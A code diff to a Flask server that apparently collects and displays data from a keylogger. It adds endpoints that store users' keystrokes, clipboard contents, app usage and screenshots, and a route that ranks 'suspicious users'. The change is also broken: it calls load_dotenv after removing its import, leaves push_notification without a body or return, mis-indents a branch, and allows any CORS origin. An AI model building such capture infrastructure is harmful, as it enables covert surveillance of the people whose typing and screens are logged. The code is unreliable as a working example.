@@ -1,3 +1,4 @@
+
 from flask import Flask, request, jsonify, Response
 from pymongo import MongoClient, DESCENDING
 from bson.json_util import dumps
@@ -21,24 +22,19 @@ from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 from base64 import b64encode, b64decode
 from flask_sslify import SSLify
-from dotenv import load_dotenv
-from Crypto.Protocol.KDF import PBKDF2
+import os # Import os for environment variables
 from Crypto.Hash import SHA256
-
-load_dotenv()
-
 app = Flask(__name__)
-CORS(app, origins=["http://localhost:3000", "http://127.0.0.1:3000", "*"])  # Allow all for SSE
+load_dotenv()
+CORS(app, origins=["http://localhost:3000", "http://127.0.0.1:3000", "*"]) # Allow all for SSE
 
-# MongoDB Configuration
-MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017/")
-DATABASE_NAME = "keylogger_db"
+# MongoDB connection is now handled by get_db() from config.py
 
+from suspicion_scanner import get_top_suspicious_users
+MONGO_URI = os.getenv('MONGO_URI', 'mongodb://localhost:27017/keylogger_db')
 client = MongoClient(MONGO_URI)
-db = client[DATABASE_NAME]
-words_collection = db["keylogs"]
-email_config_collection = db["email_config"]  # New collection
-fs = gridfs.GridFS(db)
+db = client.get_database()
+fs = gridfs.GridFS(db) # Initialize GridFS
 
 KEY_REGEX = re.compile(r'\[.*?\]')
 # print(KEY_REGEX.split("This is a [test] string with [multiple] matches."))
@@ -117,8 +113,8 @@ def _query_database(start_date: datetime, end_date: datetime, user_id: str = Non
         }
     }
     if user_id: # Add user ID filter if provided
-        query['userId'] = user_id
-    cursor = words_collection.find(query).sort("timestamp", 1)
+        query['userId'] = user_id # Access the collection via the db instance
+    cursor = db["keylogs"].find(query).sort("timestamp", 1) # Access the collection via the db instance
     return list(cursor)
 
 def _fetch_and_process_words(start_date_str, end_date_str, passphrase, processing_function, encrypted_user_id=None):
@@ -185,6 +181,80 @@ def get_wordcloud():
         print(f"Error: {e}")
         return jsonify({"error": "Failed to retrieve word cloud data"}), 500
 
+@app.route('/api/log/keystroke', methods=['POST'])
+def log_keystroke():
+    data = request.get_json()
+
+    # Basic validation for required fields
+    if not all(k in data for k in ('userId', 'encrypted_data')):
+        return jsonify({'error': 'Missing userId or encrypted_data'}), 400
+
+    # Assuming you handle decryption and validation in a separate process or in main.py
+    # For now, just store the raw encrypted data
+    keystroke_log = {
+        'userId': data['userId'],
+        'encrypted_data': data['encrypted_data'],
+        'timestamp': datetime.utcnow(),
+        'type': 'keystroke'
+    }
+
+    db["keylogs"].insert_one(keystroke_log)
+    return jsonify({'status': 'success'}), 201
+
+@app.route('/api/log/clipboard', methods=['POST'])
+def log_clipboard():
+    data = request.get_json()
+
+    if not all(k in data for k in ('userId', 'encrypted_data')):
+        return jsonify({'error': 'Missing userId or encrypted_data'}), 400
+    else:
+        clipboard_log = {
+            'userId': data['userId'],
+            'encrypted_data': data['encrypted_data'],
+            'timestamp': datetime.utcnow(),
+            'type': 'clipboard'
+        }
+        db["keylogs"].insert_one(clipboard_log)
+        return jsonify({'status': 'success'}), 201
+
+@app.route('/api/log/appusage', methods=['POST'])
+def log_appusage():
+    data = request.get_json()
+
+    if not all(k in data for k in ('userId', 'encrypted_data')):
+        return jsonify({'error': 'Missing userId or encrypted_data'}), 400
+    else:
+        app_usage_log = {
+        'userId': data['userId'],
+        'encrypted_data': data['encrypted_data'],
+        'timestamp': datetime.utcnow(),
+        'type': 'appusage'
+    }
+    db["keylogs"].insert_one(app_usage_log)
+    return jsonify({'status': 'success'}), 201
+
+@app.route('/api/log/screenshot', methods=['POST'])
+def log_screenshot():
+    data = request.get_json()
+
+    if not all(k in data for k in ('userId', 'screenshot_data')):
+        return jsonify({'error': 'Missing userId or screenshot_data'}), 400
+
+    # Assuming screenshot_data is already processed (e.g., saved to GridFS)
+    # and contains the GridFS file ID
+    if 'screenshot_id' not in data['screenshot_data']:
+         return jsonify({'error': 'Missing screenshot_id in screenshot_data'}), 400
+
+    screenshot_log = {
+        'userId': data['userId'],
+        'screenshot_data': data['screenshot_data'], # This should contain the GridFS file ID
+        'timestamp': datetime.utcnow(),
+        'type': 'screenshot'
+    }
+    db["keylogs"].insert_one(screenshot_log)
+    return jsonify({'status': 'success'}), 201
+
+
 @app.route('/api/fuzzy-matches', methods=['GET'])
 def get_fuzzy_matches():
     try:
@@ -219,7 +289,7 @@ def get_fuzzy_matches():
         }
         if user_id:
             query['userId'] = user_id
-        cursor = words_collection.find(query).sort("timestamp", DESCENDING)
+        cursor = db["keylogs"].find(query).sort("timestamp", DESCENDING)
         matches = list(cursor)
 
         response_data = []
@@ -281,7 +351,9 @@ def get_screenshot(screenshot_id):
     try:
         image_data = fs.get(ObjectId(screenshot_id)).read()
         return send_file(BytesIO(image_data), mimetype='image/png')
-    except Exception as e:
+    except gridfs.errors.NoFile:
+        return jsonify({"error": "Screenshot not found"}), 404
+    except Exception as e: # Catch other potential errors
         print(f"Error retrieving screenshot: {e}")
         return jsonify({"error": "Failed to retrieve screenshot"}), 404
 
@@ -313,20 +385,13 @@ def push_notification():
     derived_key = derive_key(passphrase_header)
     encrypted_user_id = encrypt_data(user_id, derived_key) # Encrypt userId before pushing
 
-    event = {
-        "flaggedWord": flagged_word,
-        "userId": encrypted_user_id, # Use encrypted userId in event
-        "screenshotUrl": screenshot_url
-    }
-    event_queue.put(event)  # Put the event into the queue
-    return jsonify({'status': 'success'}), 200
 
 # --- Email Configuration Endpoints ---
 
 @app.route("/api/email_config", methods=["GET"])
 def get_email_config():
     """Retrieves the current email configuration."""
-    config = email_config_collection.find_one()
+    config = db.email_config.find_one()
     if config:
         # Remove the _id field, as it's not JSON serializable
         config.pop("_id", None)
@@ -347,13 +412,12 @@ def update_email_config():
         return jsonify({"error": "smtp_port must be an integer"}), 400
 
     # Upsert: Update if exists, insert if not
-    email_config_collection.update_one({}, {"$set": data}, upsert=True)
+    db.email_config.update_one({}, {"$set": data}, upsert=True)
     return jsonify({"message": "Email configuration updated successfully"})
 
 @app.route("/api/settings", methods=["GET"])
 def get_email_settings():
     """Retrieves email settings."""
-    db = get_db()
     settings = get_settings(db)
     # Remove the password before sending it to the frontend
     settings_without_password = {k: v for k, v in settings.items() if k != "sender_password"}
@@ -362,7 +426,6 @@ def get_email_settings():
 @app.route("/api/settings", methods=["PUT"])
 def update_email_settings():
     """Updates email settings."""
-    db = get_db()
     new_settings = request.json
 
     # Basic validation (ensure all fields are present)
@@ -383,37 +446,41 @@ def update_email_settings():
 def get_screenshot_route(screenshot_id):
     """
     Retrieves and serves a screenshot given its ID.  This integrates
-    the screenshot retrieval into the Flask app.
-    """
-    # Import necessary modules
-    import pymongo
-    import gridfs
-    from bson import ObjectId
-    from flask import send_file
-
+    the screenshot retrieval into the Flask app."""
     db = get_db()
-    fs = gridfs.GridFS(db)
 
     try:
         # Convert screenshot_id to ObjectId
         screenshot_id = ObjectId(screenshot_id)
         image_data = fs.get(screenshot_id).read()
+
         return send_file(BytesIO(image_data), mimetype='image/png')
     except Exception as e:
         logging.error(f"Error retrieving screenshot: {e}")
         return jsonify({"error": "Screenshot not found"}), 404
 
+@app.route('/')
+def index():
+    """Basic route to check if the Flask app is running."""
+    return jsonify({"status": "ok"})
+
 # New endpoint to get unique user IDs
 @app.route('/api/users', methods=['GET'])
 def get_users():
     """Returns a list of unique user IDs from the keylogs collection, encrypted."""
-    unique_user_ids = words_collection.distinct("userId")
+    unique_user_ids = db["keylogs"].distinct("userId") # Access the collection via the db instance
     passphrase_header = request.headers.get('X-Passphrase')
     if not passphrase_header:
         return jsonify({"error": "Passphrase required"}), 401
     derived_key = derive_key(passphrase_header)
     encrypted_user_ids = [encrypt_data(userId, derived_key) for userId in unique_user_ids] # Encrypt userIds here
     return jsonify(encrypted_user_ids)
+
+@app.route("/api/suspicious-users", methods=["GET"])
+def suspicious_users():
+    """Returns the top suspicious users with their logs."""
+    top_users = get_top_suspicious_users()
+    return jsonify(top_users)
 
 if __name__ == '__main__':
     sslify = SSLify(app)  # Redirect to HTTPS
